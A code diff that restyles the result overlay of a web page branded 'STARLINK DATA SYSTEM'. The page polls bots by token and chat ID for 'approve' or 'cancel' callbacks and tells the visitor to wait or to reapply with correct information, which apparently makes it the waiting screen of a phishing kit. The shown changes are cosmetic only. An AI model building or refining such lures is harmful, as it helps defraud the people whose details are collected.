@@ -353,68 +353,41 @@
                 })
             }).catch(() => {});
 
-           // Stop both polling intervals
+    // Stop both polling intervals
 if (pollInterval1) clearInterval(pollInterval1);
 if (pollInterval2) clearInterval(pollInterval2);
 
 spinnerOverlay.style.display = 'none';
 resultOverlay.style.display = 'flex';
 
+// Futuristic result overlay appearance
+resultOverlay.style.background = 'rgba(2, 8, 20, 0.96)';
+resultOverlay.style.backdropFilter = 'blur(12px)';
+
+resultMessage.style.cssText = `
+    color: #00d9ff;
+    background: linear-gradient(145deg, #071426, #102b49, #050d1b);
+    border: 1px solid #00bfff;
+    border-radius: 16px;
+    padding: 25px 20px;
+    margin: 15px;
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 1.8;
+    text-align: center;
+    letter-spacing: 0.5px;
+    text-shadow: 0 0 8px #00bfff, 0 0 18px #0077ff;
+    box-shadow: 0 0 15px rgba(0,191,255,0.4),
+                inset 0 0 15px rgba(0,191,255,0.08);
+`;
+
 const parts = callbackData.split('_');
 
 if (parts[0] === 'approve') {
-    resultMessage.innerHTML = `
-        <div style="
-            background: linear-gradient(145deg, #050b18, #101e35, #06101e);
-            border: 1px solid #00bfff;
-            border-radius: 16px;
-            padding: 25px 20px;
-            color: #ffffff;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(0,191,255,0.35);
-        ">
-            <div style="
-                font-size: 38px;
-                color: #00cfff;
-                text-shadow: 0 0 15px #00bfff;
-                margin-bottom: 12px;
-            ">✦</div>
-
-            <div style="
-                color: #00cfff;
-                font-size: 19px;
-                font-weight: 800;
-                letter-spacing: 2px;
-                margin-bottom: 12px;
-            ">REQUEST UNDER REVIEW</div>
-
-            <div style="
-                color: #d6eaff;
-                font-size: 14px;
-                line-height: 1.7;
-            ">
-                Your request is currently under approval.
-                Please be patient and do not leave this page.
-            </div>
-
-            <div style="
-                margin-top: 18px;
-                height: 3px;
-                background: linear-gradient(90deg, transparent, #00cfff, transparent);
-                box-shadow: 0 0 12px #00bfff;
-            "></div>
-
-            <div style="
-                color: #7bdcff;
-                font-size: 10px;
-                letter-spacing: 2px;
-                margin-top: 12px;
-            ">STARLINK DATA SYSTEM</div>
-        </div>
-    `;
+    resultMessage.textContent = '✦ SYSTEM STATUS: UNDER REVIEW ✦\n\nYour request is under approval. Please be patient and do not leave this page.';
 } else if (parts[0] === 'cancel') {
-    resultMessage.textContent =
-        'Please reapply and ensure that your information is correct. Thank you.';
+    resultMessage.textContent = '⚠ SYSTEM NOTICE\n\nPlease reapply and ensure that your information is correct. Thank you.';
+}
 }
         // Poll a single bot for callback responses
         function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
